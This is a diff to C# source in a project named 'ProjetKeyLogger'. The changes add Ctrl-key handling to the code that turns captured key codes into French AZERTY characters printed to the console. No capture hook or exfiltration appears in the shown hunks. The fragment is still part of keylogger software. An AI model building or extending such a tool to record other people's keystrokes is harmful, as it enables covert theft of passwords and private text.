@@ -136,22 +136,31 @@ namespace ProjetKeyLogger
                             case 55:
                             case 56:
                             case 57:
-                                if (majuscule==false & altgr==false & shift==false)
+                                if (ctrl == true)
                                 {
-                                    valeurs = "à&é\"'(-è_ç";
-                                    Console.Write(valeurs.Substring(codeASCII - 48, 1));
-                                } else
+                                    ctrl = false;
+                                }
+                                else
                                 {
-                                    if (altgr == true)
+                                    if (majuscule == false & altgr == false & shift == false)
                                     {
-                                        valeurs = "@ ~#{[|`\\^";
+                                        valeurs = "à&é\"'(-è_ç";
                                         Console.Write(valeurs.Substring(codeASCII - 48, 1));
-                                        altgr = false;
-                                    } else
-                                    {
-                                        Console.Write((char)codeASCII);
                                     }
-                                }                                
+                                    else
+                                    {
+                                        if (altgr == true)
+                                        {
+                                            valeurs = "@ ~#{[|`\\^";
+                                            Console.Write(valeurs.Substring(codeASCII - 48, 1));
+                                            altgr = false;
+                                        }
+                                        else
+                                        {
+                                            Console.Write((char)codeASCII);
+                                        }
+                                    }
+                                }
                                 break;
 
                             //cas du pavé numérique
@@ -165,7 +174,14 @@ namespace ProjetKeyLogger
                             case 103:
                             case 104:
                             case 105:
-                                Console.Write((int)codeASCII - 96);
+                                if (ctrl == true)
+                                {
+                                    ctrl = false;
+                                }
+                                else
+                                {
+                                    Console.Write((int)codeASCII - 96);
+                                }
                                 break;
 
                             //Touches à côté du pavé numérique
@@ -174,8 +190,15 @@ namespace ProjetKeyLogger
                             case 109:
                             case 110:
                             case 111:
-                                valeurs = "*+ -./";
-                                Console.Write(valeurs.Substring(codeASCII - 106, 1));
+                                if (ctrl == true)
+                                {
+                                    ctrl = false;
+                                }
+                                else
+                                {
+                                    valeurs = "*+ -./";
+                                    Console.Write(valeurs.Substring(codeASCII - 106, 1));
+                                }
                                 break;
 
                             //verrouillage du pavé numerique
@@ -210,21 +233,29 @@ namespace ProjetKeyLogger
                             case 190:
                             case 191:
                             case 192:
-                                valeurs = "$=, ;:ù£+? ./%¤}";
-                                if ((majuscule == true | shift == true)& altgr==false)
+                                if (ctrl == true)
                                 {
-                                    Console.Write(valeurs.Substring(codeASCII - 179, 1));
-                                    shift = false;
+                                    ctrl = false;
                                 }
                                 else
                                 {
-                                    if (altgr == true & (codeASCII==186 | codeASCII==187))
+                                    valeurs = "$=, ;:ù£+? ./%¤}";
+                                    if ((majuscule == true | shift == true) & altgr == false)
                                     {
-                                        Console.Write(valeurs.Substring(codeASCII - 172, 1));
-                                        altgr = false;
-                                    } else
+                                        Console.Write(valeurs.Substring(codeASCII - 179, 1));
+                                        shift = false;
+                                    }
+                                    else
                                     {
-                                        Console.Write(valeurs.Substring(codeASCII - 186, 1));
+                                        if (altgr == true & (codeASCII == 186 | codeASCII == 187))
+                                        {
+                                            Console.Write(valeurs.Substring(codeASCII - 172, 1));
+                                            altgr = false;
+                                        }
+                                        else
+                                        {
+                                            Console.Write(valeurs.Substring(codeASCII - 186, 1));
+                                        }
                                     }
                                 }
                                 break;
@@ -236,33 +267,48 @@ namespace ProjetKeyLogger
                             case 221:
                             case 222:
                             case 223:
-                                valeurs = ")*^²!°µ¨²§";
-                                if ((majuscule == true | shift==true)& altgr==false)
+                                if (ctrl == true)
                                 {
-                                    Console.Write(valeurs.Substring(codeASCII - 214, 1));
-                                    shift =false;
+                                    ctrl = false;
                                 }
                                 else
                                 {
-                                    if(altgr==true & codeASCII==219) {
-                                        Console.Write("]");
+                                    valeurs = ")*^²!°µ¨²§";
+                                    if ((majuscule == true | shift == true) & altgr == false)
+                                    {
+                                        Console.Write(valeurs.Substring(codeASCII - 214, 1));
+                                        shift = false;
                                     }
                                     else
                                     {
-                                        Console.Write(valeurs.Substring(codeASCII - 219, 1));
+                                        if (altgr == true & codeASCII == 219)
+                                        {
+                                            Console.Write("]");
+                                        }
+                                        else
+                                        {
+                                            Console.Write(valeurs.Substring(codeASCII - 219, 1));
+                                        }
                                     }
                                 }
                                 break;
 
                             case 226:
-                                if (shift== false)
+                                if (ctrl == true)
                                 {
-                                    Console.Write("<");
+                                    ctrl = false;
                                 }
                                 else
                                 {
-                                    Console.Write(">");
-                                    shift = false;
+                                    if (shift == false)
+                                    {
+                                        Console.Write("<");
+                                    }
+                                    else
+                                    {
+                                        Console.Write(">");
+                                        shift = false;
+                                    }
                                 }
                                 break;
 
